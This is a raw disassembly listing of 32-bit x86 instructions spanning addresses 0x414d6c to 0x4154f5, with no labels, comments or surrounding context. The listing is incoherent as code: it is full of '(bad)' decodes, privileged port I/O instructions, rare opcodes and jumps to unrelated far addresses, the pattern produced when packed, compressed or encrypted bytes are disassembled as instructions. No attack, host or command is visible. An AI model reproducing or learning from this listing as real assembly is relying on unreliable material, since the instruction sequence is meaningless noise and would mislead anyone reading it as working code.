  414d6c:	stos   BYTE PTR es:[edi],al
  414d6d:	shl    BYTE PTR [ecx+edi*2+0x5c],1
  414d71:	pop    edx
  414d72:	push   ecx
  414d73:	ret    0xda31
  414d76:	pop    ebp
  414d77:	mov    ecx,0x91e8e0d8
  414d7c:	dec    esp
  414d7d:	std    
  414d7e:	icebp  
  414d7f:	xchg   ebx,eax
  414d80:	adc    edx,eax
  414d82:	adc    DWORD PTR [eax-0x3f08ab61],edx
  414d88:	lods   eax,DWORD PTR ds:[esi]
  414d89:	js     0x414d2a
  414d8b:	add    al,0x8c
  414d8d:	mov    ah,BYTE PTR [esi+0x24]
  414d90:	lods   eax,DWORD PTR ds:[esi]
  414d91:	mul    BYTE PTR [ebp+0x12]
  414d94:	fld    st(2)
  414d96:	test   eax,0x3226c01e
  414d9b:	ror    DWORD PTR [edx],cl
  414d9d:	mov    al,ds:0xb21269d6
  414da2:	inc    edi
  414da3:	nop
  414da4:	mov    cl,0x13
  414da6:	inc    edx
  414da7:	dec    ebx
  414da8:	test   DWORD PTR [ecx-0x64fcf85e],0xd69e3bf6
  414db2:	lods   al,BYTE PTR ds:[esi]
  414db3:	test   DWORD PTR [edx*1+0x6324a8b8],esi
  414dba:	bound  eax,QWORD PTR [ecx+0x13deb7ad]
  414dc0:	xor    dl,BYTE PTR [ecx]
  414dc2:	mov    bl,0x60
  414dc4:	push   ebx
  414dc5:	mov    DWORD PTR [esi+0x6c3663c1],edi
  414dcb:	push   edi
  414dcc:	or     eax,0x2891214b
  414dd1:	aad    0x33
  414dd3:	xor    esp,ebp
  414dd5:	pop    esi
  414dd6:	retf   0xd9fd
  414dd9:	jo     0x414d5d
  414ddb:	mov    eax,ds:0xa9068083
  414de0:	jmp    0x493a4840
  414de5:	mov    ah,0xef
  414de7:	(bad)  
  414de8:	leave  
  414de9:	mov    WORD PTR [ebx-0x46],?
  414dec:	aad    0x40
  414dee:	push   0x26
  414df0:	cmp    esi,DWORD PTR [ecx-0x9e4598a]
  414df6:	js     0x414dea
  414df8:	sbb    DWORD PTR [ebp-0x21cba380],0xfffffff0
  414dff:	adc    edx,DWORD PTR [ebx-0x26]
  414e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e03:	div    edi
  414e05:	cs push ecx
  414e07:	jmp    0x835c2eaa
  414e0c:	mov    ds:0x8aeca60a,al
  414e11:	imul   ecx,ebx,0xbf4c6ba6
  414e17:	ror    BYTE PTR [ebx+0x5bc654c8],1
  414e1d:	jmp    DWORD PTR [eax+0x836c355]
  414e23:	jnp    0x414e8a
  414e25:	ret    
  414e26:	aam    0xc
  414e28:	cmp    BYTE PTR [eax+0x31],0x67
  414e2c:	sub    ebp,DWORD PTR [eax]
  414e2e:	mov    BYTE PTR [eax],0x56
  414e31:	mov    dl,0xc9
  414e33:	push   esi
  414e34:	mov    cs,ebp
  414e36:	mov    esp,0x85defc68
  414e3b:	inc    esp
  414e3c:	mov    edx,0x6d52812
  414e41:	lds    esp,FWORD PTR [ecx]
  414e43:	daa    
  414e44:	mov    edx,0xb3a3a126
  414e49:	out    dx,eax
  414e4a:	outs   dx,DWORD PTR ds:[esi]
  414e4b:	clc    
  414e4c:	push   esi
  414e4d:	xchg   edx,eax
  414e4e:	and    esp,DWORD PTR [edx]
  414e50:	nop
  414e51:	ror    DWORD PTR [edx-0x5e],0xe9
  414e55:	push   ebx
  414e56:	mov    dh,0xc3
  414e58:	arpl   ax,cx
  414e5a:	fisubr WORD PTR [ebx+0x67]
  414e5d:	ds out dx,al
  414e5f:	ja     0x414e51
  414e61:	jmp    0x414ea1
  414e63:	ffreep st(6)
  414e65:	(bad)  [edx+0x62]
  414e68:	inc    esi
  414e69:	cmp    esp,DWORD PTR [ecx+0x7c7d3386]
  414e6f:	scas   eax,DWORD PTR es:[edi]
  414e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e71:	ja     0x414e2f
  414e73:	outs   dx,BYTE PTR ds:[esi]
  414e74:	stc    
  414e75:	cmp    al,BYTE PTR [edi-0x2925e315]
  414e7b:	mov    DWORD PTR [ebx],ebp
  414e7d:	daa    
  414e7e:	push   ecx
  414e7f:	loopne 0x414e79
  414e81:	popa   
  414e82:	std    
  414e83:	add    ebp,eax
  414e85:	push   edi
  414e86:	xlat   BYTE PTR ds:[ebx]
  414e87:	sub    BYTE PTR [ecx],bl
  414e89:	push   ds
  414e8a:	out    dx,eax
  414e8b:	add    al,0xcb
  414e8d:	jne    0x414e4d
  414e8f:	cmp    eax,DWORD PTR [edi+0x54]
  414e92:	or     DWORD PTR [ecx+esi*8-0x2c],0xffffff8f
  414e97:	lock sbb eax,0xc5648769
  414e9d:	xchg   ebx,eax
  414e9e:	xor    eax,0x8d75da9
  414ea3:	push   esi
  414ea4:	addr16 jns 0x414ee0
  414ea7:	and    bh,cl
  414ea9:	and    eax,0x15726507
  414eae:	dec    ebp
  414eaf:	cmp    eax,0xb4148781
  414eb4:	jns    0x414e6c
  414eb6:	gs in  eax,0xc7
  414eb9:	mov    esp,0xec287c7c
  414ebe:	sahf   
  414ebf:	fadd   QWORD PTR [esi]
  414ec1:	and    dl,BYTE PTR [ebx]
  414ec3:	sbb    al,0xc7
  414ec5:	aas    
  414ec6:	mov    edx,0x5fcd1c38
  414ecb:	lods   al,BYTE PTR ds:[esi]
  414ecc:	cs xor ah,dh
  414ecf:	stc    
  414ed0:	ret    
  414ed1:	jg     0x414ec0
  414ed3:	int3   
  414ed4:	(bad)  
  414ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed6:	and    al,0xb0
  414ed8:	mov    ebp,0x892d6982
  414edd:	stc    
  414ede:	and    esp,DWORD PTR [ebx+0x15d7704]
  414ee4:	jg     0x414e95
  414ee6:	sub    eax,0xc1f0d0c1
  414eeb:	add    al,0xe
  414eed:	cld    
  414eee:	fidiv  DWORD PTR [edi-0x53]
  414ef1:	adc    al,0xe3
  414ef3:	xor    bl,BYTE PTR [ebp+0x61]
  414ef6:	add    esp,eax
  414ef8:	out    dx,al
  414ef9:	inc    esi
  414efa:	repnz sbb eax,0x1a1b95bb
  414f00:	xor    BYTE PTR [edi-0x6e],ch
  414f03:	test   BYTE PTR [ebx+0x3c7ff88a],dh
  414f09:	repz mov cl,0x9d
  414f0c:	fst    DWORD PTR [esi-0x20e0cd89]
  414f12:	and    eax,0xaead96a
  414f17:	fs xchg edx,eax
  414f19:	push   esp
  414f1a:	mov    al,ds:0x784494b5
  414f1f:	dec    eax
  414f20:	mov    eax,0x55edb22f
  414f25:	fistp  WORD PTR [ecx-0x7abe9edd]
  414f2b:	push   ebx
  414f2c:	mov    eax,DWORD PTR [edi+0x69e9521]
  414f32:	pop    eax
  414f33:	clc    
  414f34:	test   BYTE PTR [edx],ch
  414f36:	(bad)  
  414f37:	jb     0x414f8e
  414f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f3a:	int3   
  414f3b:	mov    esp,DWORD PTR [edx]
  414f3d:	shr    BYTE PTR [edx-0x43],cl
  414f40:	jl     0x414eda
  414f42:	sbb    BYTE PTR [edi+0x6eba1385],cl
  414f48:	mov    dl,0x54
  414f4a:	pop    esp
  414f4b:	sub    dh,bl
  414f4d:	aas    
  414f4e:	lahf   
  414f4f:	push   esp
  414f50:	in     eax,dx
  414f51:	mov    ecx,0x1beb5242
  414f56:	mov    bh,0xd4
  414f58:	xchg   ebp,eax
  414f59:	xchg   edi,eax
  414f5a:	sar    DWORD PTR [esi+0x1a],1
  414f5d:	jecxz  0x414f71
  414f5f:	cwde   
  414f60:	ret    0x4b2
  414f63:	xor    DWORD PTR [esi],ecx
  414f65:	int3   
  414f66:	scas   eax,DWORD PTR es:[edi]
  414f67:	add    DWORD PTR [ebx-0x26],ebx
  414f6a:	cmp    DWORD PTR gs:[edi],ebp
  414f6d:	pop    ebp
  414f6e:	in     eax,dx
  414f6f:	aas    
  414f70:	jo     0x414f1b
  414f72:	pop    esi
  414f73:	adc    eax,0xeb9cd57d
  414f78:	xchg   esi,eax
  414f79:	or     ebx,esi
  414f7b:	(bad)  
  414f7c:	mov    edi,0x3a5c14e7
  414f81:	push   eax
  414f82:	inc    edx
  414f83:	ss fs arpl di,si
  414f87:	mov    dl,0xfa
  414f89:	and    cl,BYTE PTR [ebx+edi*8]
  414f8c:	add    edx,DWORD PTR [ebx]
  414f8e:	stc    
  414f8f:	cmp    eax,0xad0e0347
  414f94:	mov    eax,0x5070ef1b
  414f99:	outs   dx,BYTE PTR ds:[esi]
  414f9a:	xor    BYTE PTR [eax],0x7a
  414f9d:	std    
  414f9e:	push   ds
  414f9f:	pop    ss
  414fa0:	xchg   edi,eax
  414fa1:	icebp  
  414fa2:	or     ebp,DWORD PTR [ecx-0x4c]
  414fa5:	sbb    al,0x53
  414fa7:	sti    
  414fa8:	sti    
  414fa9:	pop    ss
  414faa:	(bad)  
  414fab:	stos   BYTE PTR es:[edi],al
  414fac:	jo     0x415021
  414fae:	sub    BYTE PTR [ecx-0x7a],0xd
  414fb2:	scas   eax,DWORD PTR es:[edi]
  414fb3:	jns    0x414f9b
  414fb5:	inc    ecx
  414fb6:	fdiv   QWORD PTR [edi+0x1d]
  414fb9:	lock push eax
  414fbb:	int3   
  414fbc:	mov    dl,0x33
  414fbe:	cmp    ch,BYTE PTR [esi-0x1]
  414fc1:	or     eax,0x2c24ee81
  414fc6:	push   cs
  414fc7:	jno    0x414ff5
  414fc9:	std    
  414fca:	inc    edx
  414fcb:	call   0x8097d74
  414fd0:	jge    0x415014
  414fd2:	sbb    eax,0x675c39e6
  414fd7:	adc    DWORD PTR [ebp+0x44],0x27f7a890
  414fde:	add    al,0xdb
  414fe0:	or     al,0x51
  414fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fe3:	(bad)  
  414fe4:	fsubr  DWORD PTR [edi+0x5e17096f]
  414fea:	or     al,BYTE PTR [esi]
  414fec:	xor    DWORD PTR [ebx+edx*1],ebx
  414fef:	xchg   esp,eax
  414ff0:	push   eax
  414ff1:	clc    
  414ff2:	pop    edx
  414ff3:	inc    edi
  414ff4:	jbe    0x414fc8
  414ff6:	test   al,0x71
  414ff8:	aaa    
  414ff9:	xchg   DWORD PTR [edx],eax
  414ffb:	xchg   esi,eax
  414ffc:	pop    esp
  414ffd:	(bad)  
  414ffe:	rcr    BYTE PTR [esi],0xfe
  415001:	xlat   BYTE PTR ds:[ebx]
  415002:	pop    edi
  415003:	lock popf 
  415005:	add    bh,BYTE PTR [ecx]
  415007:	mov    edx,0x9b233495
  41500c:	adc    ecx,DWORD PTR [esi+0x24]
  41500f:	jae    0x41507e
  415011:	and    BYTE PTR [ebx],cl
  415013:	hlt    
  415014:	cmp    DWORD PTR [ebp+0x75],ecx
  415017:	jge    0x415007
  415019:	adc    bh,BYTE PTR ds:0xd7901641
  41501f:	cmp    edi,DWORD PTR [esi-0x21b7dc4b]
  415025:	in     eax,0x2
  415027:	test   DWORD PTR [edx],0x67bf406b
  41502d:	jmp    0x59dcb38b
  415032:	ins    DWORD PTR es:[edi],dx
  415033:	push   ss
  415034:	repz add al,0x50
  415037:	pop    es
  415038:	aas    
  415039:	push   ebp
  41503a:	cmp    ebp,edi
  41503c:	push   esi
  41503d:	and    eax,0x6ea557d2
  415042:	xchg   esi,eax
  415043:	mov    cl,0x1b
  415045:	dec    ebp
  415046:	mov    eax,0xcedd35f
  41504b:	ins    DWORD PTR es:[edi],dx
  41504c:	cmp    al,0x93
  41504e:	sub    BYTE PTR [edx],0x49
  415051:	bnd ja 0x415039
  415054:	add    al,0x53
  415056:	push   ebp
  415057:	test   DWORD PTR [ebp-0x5731bcb8],eax
  41505d:	call   DWORD PTR [eax-0x79cf128]
  415063:	(bad)  
  415064:	or     eax,0x1063556e
  415069:	test   DWORD PTR [esi+0x5847af08],edi
  41506f:	jb     0x415004
  415071:	jae    0x415001
  415073:	fmul   QWORD PTR [ecx]
  415075:	(bad)  
  415076:	mov    dl,0x23
  415078:	xchg   DWORD PTR [ebp-0x2b],esi
  41507b:	push   cs
  41507c:	xchg   esi,eax
  41507d:	outs   dx,DWORD PTR ds:[esi]
  41507e:	das    
  41507f:	push   es
  415080:	out    dx,eax
  415081:	dec    edx
  415082:	gs pop ss
  415084:	inc    edi
  415085:	arpl   bp,cx
  415087:	bound  esp,QWORD PTR [ecx+edx*4]
  41508a:	iret   
  41508b:	dec    eax
  41508c:	mov    ch,0x1
  41508e:	xor    al,0xf1
  415090:	xor    bl,BYTE PTR [edi]
  415092:	or     al,0x82
  415094:	and    dh,0x5b
  415097:	shl    ah,cl
  415099:	in     al,dx
  41509a:	xor    DWORD PTR [edi-0x7e],edx
  41509d:	cs shl ebx,cl
  4150a0:	mov    ah,0x9e
  4150a2:	mov    bh,0xca
  4150a4:	out    dx,al
  4150a5:	mov    ch,BYTE PTR [eax+0x5e]
  4150a8:	dec    edx
  4150a9:	enter  0xfd37,0xcd
  4150ad:	test   ah,cl
  4150af:	xchg   ebx,eax
  4150b0:	sbb    al,0x37
  4150b2:	test   DWORD PTR [ecx+ecx*1],eax
  4150b5:	rol    BYTE PTR [ecx-0x22],1
  4150b8:	push   0x90c427c9
  4150bd:	xchg   ecx,eax
  4150be:	jns    0x41506d
  4150c0:	mov    dl,0x3d
  4150c2:	lea    eax,[edx]
  4150c4:	pop    ebx
  4150c5:	xor    DWORD PTR [ebp+edi*4+0x7f4f5625],0xd3f4d27c
  4150d0:	jmp    0x415099
  4150d2:	xchg   edx,eax
  4150d3:	(bad)  
  4150d4:	aaa    
  4150d5:	xor    edx,DWORD PTR ds:0xa00ff63c
  4150db:	jg     0x415143
  4150dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150de:	outs   dx,BYTE PTR ds:[esi]
  4150df:	pop    ds
  4150e0:	ds js  0x415150
  4150e3:	xor    bh,BYTE PTR [ecx-0x184c6a0c]
  4150e9:	fistp  WORD PTR [ecx-0xfc26e2a]
  4150ef:	mov    ds,WORD PTR [ebx-0x56]
  4150f2:	adc    edx,DWORD PTR [eax+0x3bd6d6b7]
  4150f8:	pop    es
  4150f9:	xor    edi,ecx
  4150fb:	dec    ebp
  4150fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150fd:	lea    eax,[esi]
  4150ff:	aas    
  415100:	sub    ah,ch
  415102:	mov    ebp,0x1cd4962f
  415107:	sub    al,0x53
  415109:	jns    0x415152
  41510b:	stos   DWORD PTR es:[edi],eax
  41510c:	mov    bl,0x9
  41510e:	or     eax,ebx
  415110:	cld    
  415111:	lahf   
  415112:	pop    edx
  415113:	xor    ch,BYTE PTR [edi-0x28]
  415116:	je     0x415168
  415118:	push   DWORD PTR [ebp-0x4c]
  41511b:	outs   dx,DWORD PTR cs:[esi]
  41511d:	pop    ebx
  41511e:	fst    QWORD PTR [edi-0x147d1fd6]
  415124:	jo     0x41511f
  415126:	retf   0xbb0d
  415129:	mov    bh,0xbe
  41512b:	repz cmp eax,0xff2089aa
  415131:	mov    al,ds:0xd76afcc
  415136:	mov    esp,DWORD PTR [ecx+0x47]
  415139:	(bad)  
  41513a:	and    eax,0x2508358
  41513f:	add    ch,BYTE PTR [ecx-0x4]
  415142:	das    
  415143:	jbe    0x415168
  415145:	pop    ecx
  415146:	pop    esi
  415147:	call   DWORD PTR [ecx-0x5c2ec834]
  41514d:	mov    ebx,0x15e32ca1
  415152:	add    cl,BYTE PTR [esi+eiz*1]
  415155:	sub    ebp,DWORD PTR [esi-0x36]
  415158:	gs in  al,dx
  41515a:	pop    esp
  41515b:	sub    eax,0x1ff27249
  415160:	adc    DWORD PTR [ebp-0x77],ecx
  415163:	add    ax,WORD PTR [eax+eax*2]
  415167:	sti    
  415168:	xor    eax,0xd8eaf4be
  41516d:	pusha  
  41516e:	out    0x96,eax
  415170:	push   esi
  415171:	imul   esi,DWORD PTR [eax-0x5273289d],0xffffffa4
  415178:	inc    ebp
  415179:	mov    edx,0x94f2ffb5
  41517e:	mov    eax,ds:0x211b7f7b
  415183:	mov    fs,WORD PTR [eax+esi*4]
  415186:	sub    eax,0x69b9552c
  41518b:	cdq    
  41518c:	inc    ebx
  41518d:	(bad)  
  41518f:	inc    esi
  415190:	out    0xcf,eax
  415192:	push   es
  415193:	sti    
  415194:	cmp    bl,BYTE PTR [eax+0x16]
  415197:	mov    BYTE PTR [edx+edi*1],ah
  41519a:	pop    ebp
  41519b:	out    0x18,al
  41519d:	pop    ebx
  41519e:	mov    ah,0x3c
  4151a0:	popa   
  4151a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a3:	hlt    
  4151a4:	push   0x26a5d9db
  4151a9:	dec    esp
  4151aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ab:	in     al,0x2c
  4151ad:	pop    edx
  4151ae:	(bad)  
  4151af:	stos   DWORD PTR es:[edi],eax
  4151b0:	fdivr  DWORD PTR [esp+ecx*2+0x6d]
  4151b4:	add    al,0xab
  4151b6:	mov    al,0xb
  4151b8:	inc    eax
  4151b9:	push   cs
  4151ba:	je     0x41515b
  4151bc:	adc    eax,0x6bd25736
  4151c1:	dec    ebx
  4151c2:	inc    ebx
  4151c3:	mov    al,ds:0x98529b0
  4151c8:	retf   
  4151c9:	inc    edi
  4151ca:	arpl   WORD PTR [ebx+0x59],si
  4151cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ce:	mov    dh,0x6
  4151d0:	cmp    al,0xd8
  4151d2:	and    al,0xac
  4151d4:	push   edx
  4151d5:	(bad)  
  4151d6:	out    0xab,al
  4151d8:	test   eax,0x9984e59a
  4151dd:	fisubr WORD PTR [ebp-0x68]
  4151e0:	bound  ebp,QWORD PTR [eax+0x1f]
  4151e3:	mov    dl,0xa5
  4151e5:	clc    
  4151e6:	push   edx
  4151e7:	or     eax,0xb3fe473d
  4151ec:	ins    DWORD PTR es:[edi],dx
  4151ed:	inc    eax
  4151ee:	lds    ebx,FWORD PTR gs:[esi+ebx*4]
  4151f2:	in     al,dx
  4151f3:	jmp    0x4a1fd3a7
  4151f8:	adc    ah,cl
  4151fa:	xchg   edi,eax
  4151fb:	in     eax,0x5b
  4151fd:	js     0x4151d7
  4151ff:	ins    BYTE PTR es:[edi],dx
  415200:	icebp  
  415201:	push   0x4fe8465
  415206:	popf   
  415207:	push   ds
  415208:	push   edx
  415209:	or     bl,ah
  41520b:	or     ecx,0xffffffb6
  41520e:	int3   
  41520f:	sub    eax,0x2dbc5336
  415214:	push   ebp
  415215:	into   
  415216:	adc    ah,al
  415218:	je     0x41520d
  41521a:	xchg   ecx,eax
  41521b:	and    eax,0x2d0acba
  415220:	clc    
  415221:	mov    edx,0xfc4f8f7a
  415226:	cmp    eax,ebx
  415228:	rol    BYTE PTR [ebp+0x2f],1
  41522b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41522c:	ret    
  41522d:	xchg   ebx,eax
  41522e:	and    ah,BYTE PTR [eax+0x76735dd6]
  415234:	shl    DWORD PTR [ecx],1
  415236:	into   
  415237:	sahf   
  415238:	xchg   BYTE PTR [eax],ah
  41523a:	out    0x6b,eax
  41523c:	add    eax,0x9c782c76
  415241:	leave  
  415242:	or     DWORD PTR [edx+0x17ecf11],ecx
  415248:	sbb    al,0x6
  41524a:	stc    
  41524b:	inc    edx
  41524c:	(bad)  
  41524d:	mov    dl,0x89
  41524f:	xlat   BYTE PTR ds:[ebx]
  415250:	ins    DWORD PTR es:[edi],dx
  415251:	xchg   esi,eax
  415252:	sub    eax,esi
  415254:	push   ecx
  415255:	mov    al,ds:0xbed3bd2c
  41525a:	sub    esp,DWORD PTR [eax+ebx*8-0x23056be5]
  415261:	jmp    DWORD PTR [edx+0x1db694cc]
  415267:	or     al,0x44
  415269:	ret    0xdbfc
  41526c:	lock repz xchg edx,eax
  41526f:	aas    
  415270:	and    dh,BYTE PTR [esi+edi*2-0x6363303c]
  415277:	xchg   esi,eax
  415278:	push   ss
  415279:	test   DWORD PTR [edi+0x5f41dde7],0x71ccc918
  415283:	mov    WORD PTR [ebp+0x26],gs
  415286:	add    bl,BYTE PTR ds:0xaf7537a9
  41528c:	add    ecx,DWORD PTR [edi]
  41528e:	frstor [ebx]
  415290:	repz dec edx
  415292:	leave  
  415293:	mov    eax,0xaa0014e5
  415298:	retf   
  415299:	out    0x93,al
  41529b:	ins    DWORD PTR es:[edi],dx
  41529c:	jns    0x415221
  41529e:	pop    es
  41529f:	jne    0x4152c9
  4152a1:	jle    0x4152ac
  4152a3:	aaa    
  4152a4:	sub    DWORD PTR [esp+edx*4+0x2171630a],esi
  4152ab:	fiadd  DWORD PTR [esi+0x303b989b]
  4152b1:	cmp    BYTE PTR [esi-0x31],0x7c
  4152b5:	fwait
  4152b6:	push   ebp
  4152b7:	ins    BYTE PTR es:[edi],dx
  4152b8:	xor    cl,bh
  4152ba:	ss aas 
  4152bc:	inc    edx
  4152bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152be:	xchg   edx,eax
  4152bf:	aam    0x65
  4152c1:	push   cs
  4152c2:	jae    0x415272
  4152c4:	jl     0x415259
  4152c6:	fcomp  QWORD PTR [ebx-0x7b]
  4152c9:	das    
  4152ca:	cmc    
  4152cb:	ins    BYTE PTR es:[edi],dx
  4152cc:	jno    0x415340
  4152ce:	pop    esi
  4152cf:	leavew 
  4152d1:	(bad)  
  4152d2:	mov    ebp,0x8217d1d9
  4152d7:	xchg   esp,eax
  4152d8:	stos   DWORD PTR es:[edi],eax
  4152d9:	sar    BYTE PTR [edi],1
  4152db:	cmp    DWORD PTR [ebp-0x4f57b331],ecx
  4152e1:	xor    al,0x90
  4152e3:	hlt    
  4152e4:	in     al,0xbd
  4152e6:	in     eax,0x2f
  4152e8:	and    dh,dh
  4152ea:	daa    
  4152eb:	loopne 0x4152d9
  4152ed:	jbe    0x415317
  4152ef:	push   cs
  4152f0:	xchg   edi,eax
  4152f1:	rcr    edi,0x1f
  4152f4:	xchg   esi,eax
  4152f5:	mov    ecx,esi
  4152f7:	mov    cs,ecx
  4152f9:	fldenv [ecx]
  4152fb:	enter  0x6bb6,0x40
  4152ff:	repz or al,BYTE PTR ss:[ecx-0x2d44baf8]
  415307:	adc    BYTE PTR [esi],ch
  415309:	inc    ebp
  41530a:	fstp   TBYTE PTR [ecx+esi*4+0x6375f50d]
  415311:	mov    al,0xe9
  415313:	je     0x415300
  415315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415316:	js     0x41532a
  415318:	shl    BYTE PTR [edi-0x41],cl
  41531b:	pop    ebp
  41531c:	pop    es
  41531d:	sbb    eax,0x3f139ba2
  415322:	cmp    dl,BYTE PTR [ecx]
  415324:	je     0x415303
  415326:	mov    ah,0x6a
  415328:	mov    DWORD PTR [ebx-0x6e],edi
  41532b:	and    ebp,esi
  41532d:	mov    ebp,eax
  41532f:	fstp   TBYTE PTR [edx+0x1bfbcf8]
  415335:	ret    0x53b1
  415338:	ins    DWORD PTR es:[edi],dx
  415339:	push   ebp
  41533a:	push   cs
  41533b:	into   
  41533c:	jno    0x4152e3
  41533e:	inc    esi
  41533f:	inc    ecx
  415340:	(bad)  
  415342:	or     BYTE PTR [ebx-0x339c116c],bl
  415348:	push   ebp
  415349:	push   eax
  41534a:	xor    BYTE PTR [ebx+eiz*8],bh
  41534d:	inc    eax
  41534e:	(bad)  
  41534f:	adc    DWORD PTR [edi+0x470dbba9],esi
  415355:	jg     0x4153c0
  415357:	mov    eax,0x28fed1c4
  41535c:	fs mov esi,0x36861818
  415362:	xchg   DWORD PTR [ecx+0x38],ebp
  415365:	cmp    DWORD PTR [ebx+0x62dac0c4],eax
  41536b:	das    
  41536c:	inc    eax
  41536d:	xchg   ebx,eax
  41536e:	pop    ecx
  41536f:	xor    eax,0xc42c07ec
  415374:	xor    eax,0x1f229581
  415379:	es stc 
  41537b:	mov    BYTE PTR ds:0x88f0c8a7,bh
  415381:	xchg   dh,dh
  415383:	pop    edx
  415384:	sbb    DWORD PTR [ebx],edi
  415386:	dec    esp
  415387:	jp     0x41535d
  415389:	sbb    ebp,DWORD PTR [edi-0x2c]
  41538c:	aaa    
  41538d:	sbb    eax,0xdd7b57d
  415392:	mov    eax,ss
  415394:	and    eax,0x8bf5c148
  415399:	das    
  41539a:	mov    esi,0x1ca794de
  41539f:	(bad)  
  4153a1:	mov    edi,es
  4153a3:	(bad)  
  4153a5:	xchg   esp,eax
  4153a6:	mov    esp,0xf60e289
  4153ab:	jmp    0x401cee68
  4153b0:	dec    ebp
  4153b1:	aaa    
  4153b2:	jp     0x415429
  4153b4:	sub    BYTE PTR [edi-0x62],0x80
  4153b8:	mov    dl,0x6
  4153ba:	or     BYTE PTR [eax+esi*1],bh
  4153bd:	cmp    edx,DWORD PTR [ebp+0x2397f396]
  4153c3:	imul   edx,DWORD PTR [edi+0x14],0xa52908ec
  4153ca:	arpl   WORD PTR [edx-0x3f],cx
  4153cd:	push   esp
  4153ce:	aas    
  4153cf:	icebp  
  4153d0:	sub    eax,0xeafeb8cf
  4153d5:	mov    ecx,DWORD PTR [edi+0x14]
  4153d8:	pop    ebx
  4153d9:	dec    esp
  4153da:	and    ebx,edx
  4153dc:	dec    esi
  4153dd:	xchg   edi,eax
  4153de:	pop    ebx
  4153df:	and    al,0xb7
  4153e1:	mov    ecx,0x5370dc1b
  4153e6:	scas   eax,DWORD PTR es:[edi]
  4153e7:	int    0x37
  4153e9:	test   BYTE PTR [edx],bl
  4153eb:	into   
  4153ec:	ins    DWORD PTR es:[edi],dx
  4153ed:	cmp    bl,dh
  4153ef:	ins    DWORD PTR es:[edi],dx
  4153f0:	push   edi
  4153f1:	popw   es
  4153f3:	fnsave [edi-0x17]
  4153f6:	and    DWORD PTR [edi+0x66cb63f8],0x5e9ae0ea
  415400:	call   DWORD PTR [ebx+edi*2+0x7c39eb0a]
  415407:	jae    0x4153ee
  415409:	xchg   ecx,eax
  41540a:	addr16 and eax,0xe0d36c4c
  415410:	data16 int 0x6
  415413:	push   ebp
  415414:	mov    al,0x2d
  415416:	clc    
  415417:	sub    DWORD PTR [ebp+0x27afd090],ecx
  41541d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41541e:	leave  
  41541f:	adc    al,0x9
  415421:	test   BYTE PTR [eax],dh
  415423:	or     BYTE PTR [edi+esi*4],ch
  415426:	aam    0x95
  415428:	inc    ebp
  415429:	cmp    BYTE PTR [eax+ebp*8],dh
  41542c:	mov    ah,0x7a
  41542e:	xchg   edx,eax
  41542f:	pop    edi
  415430:	push   ecx
  415431:	jle    0x415465
  415433:	inc    ecx
  415434:	pop    ebx
  415435:	(bad)  
  415437:	adc    DWORD PTR [ecx-0x52146b88],ebx
  41543d:	loop   0x41544e
  41543f:	dec    esp
  415440:	mov    ecx,?
  415442:	inc    edx
  415443:	push   edx
  415444:	dec    ebp
  415445:	sbb    DWORD PTR [edx+ebp*1+0x5d667874],0x5bd10eb6
  415450:	(bad)  
  415451:	popa   
  415452:	add    bl,BYTE PTR [edi-0x7f62c46b]
  415458:	cmp    eax,0xb7bada99
  41545d:	lds    ebp,FWORD PTR [edx+0x17]
  415460:	and    BYTE PTR [ebp+0x77],cl
  415463:	std    
  415464:	pop    esi
  415465:	sahf   
  415466:	adc    al,0x7a
  415468:	mov    ecx,0xf3c50aa8
  41546d:	sti    
  41546e:	outs   dx,DWORD PTR ds:[esi]
  41546f:	cmp    DWORD PTR [ecx+0x5f136f40],0x6168ca96
  415479:	jno    0x4154db
  41547b:	jmp    0xc863:0xcecede25
  415482:	add    ebx,DWORD PTR [ebp-0x159990a3]
  415488:	aad    0x5c
  41548a:	jle    0x4154a6
  41548c:	leave  
  41548d:	or     esp,ecx
  41548f:	ins    DWORD PTR es:[edi],dx
  415490:	in     al,dx
  415491:	inc    edx
  415492:	stos   BYTE PTR es:[edi],al
  415493:	mov    edi,0xd51a86be
  415498:	mov    bh,0x7e
  41549a:	mov    bh,BYTE PTR [edx+0x7e]
  41549d:	jae    0x4154ac
  41549f:	aad    0xb4
  4154a1:	hlt    
  4154a2:	add    BYTE PTR [ebx-0x3a15a044],cl
  4154a8:	(bad)  
  4154a9:	pop    ebx
  4154aa:	jmp    0x1c46e392
  4154af:	test   BYTE PTR [ecx],dl
  4154b1:	lea    ebx,[eax-0x75]
  4154b4:	push   esi
  4154b5:	add    edi,eax
  4154b7:	retf   
  4154b8:	cmp    eax,0xfd0c52be
  4154bd:	daa    
  4154be:	push   ecx
  4154bf:	dec    ebx
  4154c0:	loope  0x4154f2
  4154c2:	mov    edx,0x37a350d0
  4154c7:	xor    al,0x4f
  4154c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ca:	stos   DWORD PTR es:[edi],eax
  4154cb:	xchg   edi,eax
  4154cc:	pushf  
  4154cd:	out    0x81,al
  4154cf:	nop
  4154d0:	push   ebp
  4154d1:	es loopne 0x415465
  4154d4:	or     BYTE PTR [ebx],al
  4154d6:	fnstsw WORD PTR [edx]
  4154d8:	outs   dx,DWORD PTR ds:[esi]
  4154d9:	loop   0x41545b
  4154db:	loop   0x415545
  4154dd:	pusha  
  4154de:	or     ebp,DWORD PTR [edx-0x9]
  4154e1:	dec    esi
  4154e2:	sbb    cl,BYTE PTR [ecx+0x6b]
  4154e5:	out    0x68,al
  4154e7:	std    
  4154e8:	push   ds
  4154e9:	js     0x415566
  4154eb:	inc    esp
  4154ec:	cwde   
  4154ed:	or     DWORD PTR [edx],0xfd9c426e
  4154f3:	sbb    al,0xe7
  4154f5:	mov    edx,0xce25cd86
